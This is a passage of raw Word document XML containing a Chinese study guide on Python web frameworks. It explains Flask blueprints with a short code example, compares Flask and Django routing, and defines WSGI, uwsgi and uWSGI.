          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>.Web</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6400657E"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E427A79"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1.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>蓝图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>(Blueprint)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的理解？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57615CC8"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蓝图的定义</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>蓝图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> /Blueprint </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>应用程序组件化的方法，可以在一个应用内或跨越多个项目共用蓝图。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D3142FE"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使用蓝图可以极大简化大型应用的开发难度，也为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>扩展提供了一种在应用中注册服务的集中式机制。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E3D80C"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蓝图的应用场景：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>把一个应用分解为一个蓝图的集合。这对大型应用是理想的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E43307"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2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>一个项目可以实例化一个应用对象，初始化几个扩展，并注册一集合的蓝图。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D867853"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3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>以</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>前缀和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>或子域名，在应用上注册一个蓝图。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC2C763"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4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>前缀</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>子域名中的参数即成为这个蓝图下的所有视图函数的共同的视图参数（默认情况下）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>在一个应用中用不同的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>规则多次注册一个蓝图。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D682CDC"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5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>通过蓝图提供模板过滤器、静态文件、模板和其他功能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="408DAC3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6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>一个蓝图不一定要实现应用或视图函数。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1613BD74"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7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>初始化一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>扩展时，在这些情况中注册一个蓝图。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E57C2F7"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蓝图的缺点：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>不能在应用创建后撤销注册一个蓝图而不销毁整个应用对象。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57DF3D9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使用蓝图的三个步骤</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A49DA97" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="00CD600F">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创建一个蓝图对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E539072"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blue = Blueprint("blue",__name__)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16D94B18" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="00CD600F">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在这个蓝图对象上进行操作，例如注册路由、指定静态文件夹、注册模板过滤器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29229DE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@blue.route('/')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30116E81"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blue_index():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C929CD"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return "Welcome to my blueprint"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B555644" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="00CD600F">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在应用对象上注册这个蓝图对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43DB62C4"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lastRenderedPageBreak/>
        <w:t>app.register_blueprint(blue,url_prefix="/blue")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5268E0FA" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="00191162">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:spacing w:before="0" w:after="0" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve">1.2 Flask </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>路由映射的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C8BC69E"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在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>中，路由是浏览器访问服务器时，先访问的项目中的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，再由项目中的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>找到应用中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，这些</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是放在一个列表里，遵从从前往后匹配的规则。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394F4F2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在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>中，路由是通过装饰器给每个视图函数提供的，而且根据请求方式的不同可以一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>用于不同的作用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329D3888"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="548E8250" w14:textId="39CF57BE"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1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>、什么是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>wsgi,uwsgi,uWSGI?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2A06C8"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WSGI: web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器网关接口，是一套协议。用于接收用户请求并将请求进行初次封装，然后将请求交给</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>框架。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3953310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实现</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>wsgi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>协议的模块：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>wsgiref,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>本质上就是编写一</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>socket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务端，用于接收用户请求（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>django) werkzeug,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>本质上就是编写一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>socket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务端，用于接收用户请求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve">(flask) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="478D861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uwsgi: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>一样是一种通信协议，它是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器的独占协议，用于定义传输信息的类型。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5D9C9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uWSGI: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>服务器，实现了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的协议，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>wsgi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>协议，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>协议</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714DE35C" w14:textId="571ACA4A"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2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
